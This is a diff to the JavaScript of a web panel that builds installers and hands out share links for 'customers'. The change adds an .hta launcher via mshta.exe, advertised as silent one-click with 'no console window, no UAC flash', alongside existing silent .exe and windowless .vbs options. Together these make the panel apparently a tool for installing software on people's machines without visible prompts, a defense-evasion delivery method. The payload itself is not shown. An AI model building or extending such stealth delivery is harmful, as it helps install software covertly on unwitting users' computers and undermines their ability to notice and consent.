@@ -742,6 +742,7 @@ async function loadKeys() {
       const acts = row.querySelector('.link-actions');
       if (!k.revoked) {
         const vbsUrl = k.downloadUrl.replace('/dl/', '/launch/');
+        const htaUrl = k.downloadUrl.replace('/dl/', '/launch-hta/');
         // Copy-link buttons (share these with customers).
         const mkCopy = (label, url, tip) => {
           const b = document.createElement('button');
@@ -758,8 +759,10 @@ async function loadKeys() {
         };
         acts.appendChild(mkCopy('Copy .exe link', k.downloadUrl, 'Share with the customer. Downloads the installer (.exe); they double-click and it installs silently.'));
         acts.appendChild(mkCopy('Copy .vbs link', vbsUrl, 'Share with the customer. Silent one-click: downloads and installs with no window at all.'));
+        acts.appendChild(mkCopy('Copy .hta link', htaUrl, 'Share with the customer. Silent one-click via mshta.exe: no console window, no UAC flash.'));
         acts.appendChild(mkDl('Download .exe', k.downloadUrl, true, 'Download the installer file yourself.'));
         acts.appendChild(mkDl('Download .vbs', vbsUrl, false, 'Download the silent launcher file yourself.'));
+        acts.appendChild(mkDl('Download .hta', htaUrl, false, 'Download the silent HTA launcher file yourself.'));
       } else {
         acts.innerHTML = '<span class="tag revoked">Revoked</span>';
       }
@@ -856,6 +859,7 @@ $('#build-create').addEventListener('click', async () => {
     $('#build-download').setAttribute('download', '');
     $('#build-download').textContent = 'Download .exe';
     const vbs = $('#build-download-vbs'); if (vbs) { vbs.href = url.replace('/dl/', '/launch/'); vbs.setAttribute('download', ''); }
+    const hta = $('#build-download-hta'); if (hta) { hta.href = url.replace('/dl/', '/launch-hta/'); hta.setAttribute('download', ''); }
     $('#build-result').hidden = false;
     toast('Installer built', 'ok');
   } catch (e) { $('#build-create').disabled = false; toast(e.message || 'failed', 'err'); }
